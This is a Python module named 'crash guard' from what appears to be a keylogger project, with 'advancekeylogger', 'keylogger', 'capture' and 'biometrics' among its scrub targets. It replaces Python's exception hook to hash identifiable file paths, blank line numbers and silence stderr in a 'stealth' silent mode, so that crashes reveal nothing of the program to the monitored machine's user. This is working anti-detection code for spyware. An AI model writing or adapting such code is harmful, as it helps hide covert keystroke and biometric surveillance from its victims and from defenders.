"""
Crash guard — safe exception handling for stealth mode.

Installs a custom ``sys.excepthook`` that:
  - Strips absolute file paths from traceback frames (replaces with ``<module>``)
  - Suppresses stderr output entirely in stealth mode
  - Logs to the memory ring buffer only
  - Optionally catches and restarts on non-fatal errors

Research notes (Feb 2026):
  - ``sys.excepthook`` receives (exc_type, value, traceback) for all unhandled exceptions
  - ``traceback.TracebackException`` + ``frame_summary.filename`` allows path scrubbing
  - ``sys.__excepthook__`` is always available as fallback

Usage::

    from stealth.crash_guard import CrashGuard

    guard = CrashGuard(config, ring_buffer=log_controller.get_ring_buffer())
    guard.install()
"""
from __future__ import annotations

import hashlib
import logging
import os
import sys
import traceback as tb_module
from types import TracebackType
from typing import Any, Callable, Type

logger = logging.getLogger(__name__)

# Identifiable path segments to scrub
_SCRUB_SEGMENTS = {
    "advancekeylogger", "keylogger", "stealth", "capture",
    "biometrics", "profiler", "transport", "crypto",
    "pipeline", "engine", "fleet", "recording",
}


def _sanitize_filename(filename: str) -> str:
    """Replace identifiable file paths with opaque module references."""
    if not filename:
        return "<module>"
    basename = os.path.basename(filename)
    # If any identifiable segment is in the path, obfuscate it
    lower_path = filename.lower()
    for seg in _SCRUB_SEGMENTS:
        if seg in lower_path:
            # Generate a short stable hash so different modules still look distinct
            h = hashlib.md5(filename.encode(), usedforsecurity=False).hexdigest()[:8]
            return f"<mod_{h}>"
    return basename  # keep non-identifiable paths as just the basename


def _sanitize_lineno(filename: str) -> int:
    """Return 0 for scrubbed files to avoid leaking structure info."""
    lower_path = filename.lower()
    for seg in _SCRUB_SEGMENTS:
        if seg in lower_path:
            return 0
    return -1  # sentinel: keep original


class CrashGuard:
    """Installs safe exception handling to prevent path leaks.

    Parameters
    ----------
    config : dict
        The ``stealth`` config section (or empty dict).
    ring_buffer : MemoryRingBufferHandler, optional
        Ring buffer handler from LogController for in-memory crash logs.
    """

    def __init__(
        self,
        config: dict[str, Any] | None = None,
        ring_buffer: Any = None,
    ) -> None:
        cfg = config or {}
        self._suppress_stderr: bool = bool(cfg.get("logging", {}).get("silent_mode", False))
        self._ring_buffer = ring_buffer
        self._original_hook: Callable | None = None
        self._installed = False

    def install(self) -> None:
        """Install the sanitised exception hook."""
        if self._installed:
            return
        self._original_hook = sys.excepthook
        sys.excepthook = self._safe_excepthook
        self._installed = True
        logger.debug("Crash guard installed")

    def uninstall(self) -> None:
        """Restore the original exception hook."""
        if self._original_hook is not None:
            sys.excepthook = self._original_hook
            self._original_hook = None
        self._installed = False

    def _safe_excepthook(
        self,
        exc_type: Type[BaseException],
        exc_value: BaseException,
        exc_tb: TracebackType | None,
    ) -> None:
        """Custom excepthook that sanitises paths and optionally suppresses output."""
        try:
            # Build a TracebackException so we can manipulate frame summaries
            te = tb_module.TracebackException(exc_type, exc_value, exc_tb)

            # Scrub identifiable paths from every frame
            for frame in te.stack:
                original = frame.filename
                sanitized = _sanitize_filename(original)
                frame.filename = sanitized
                new_lineno = _sanitize_lineno(original)
                if new_lineno >= 0:
                    # _sanitize_lineno returns 0 for scrubbed files → apply it
                    frame.lineno = new_lineno
                # else: returns -1 meaning "keep original" → leave frame.lineno alone

            formatted = "".join(te.format())

            # Log to ring buffer (always, if available)
            if self._ring_buffer is not None:
                try:
                    self._ring_buffer.buffer.append({
                        "ts": __import__("time").time(),
                        "level": "CRITICAL",
                        "name": "crash_guard",
                        "msg": formatted,
                    })
                except Exception:
                    pass

            # Also log via standard logging (which will go through log controller)
            logger.critical("Unhandled exception:\n%s", formatted)

            # Suppress stderr output in stealth silent mode
            if not self._suppress_stderr:
                sys.stderr.write(formatted)

        except Exception:
            # Absolute fallback — never let the excepthook itself crash silently
            try:
                sys.__excepthook__(exc_type, exc_value, exc_tb)
            except Exception:
                pass

    def wrap_callable(self, func: Callable) -> Callable:
        """Return a wrapper that catches all exceptions from *func*.

        Useful for wrapping the main loop so no exception ever reaches stderr.
        """
        def _wrapped(*args: Any, **kwargs: Any) -> Any:
            try:
                return func(*args, **kwargs)
            except KeyboardInterrupt:
                raise  # let Ctrl+C through
            except SystemExit:
                raise  # let sys.exit through
            except Exception as exc:
                self._safe_excepthook(type(exc), exc, exc.__traceback__)
                return None
        return _wrapped
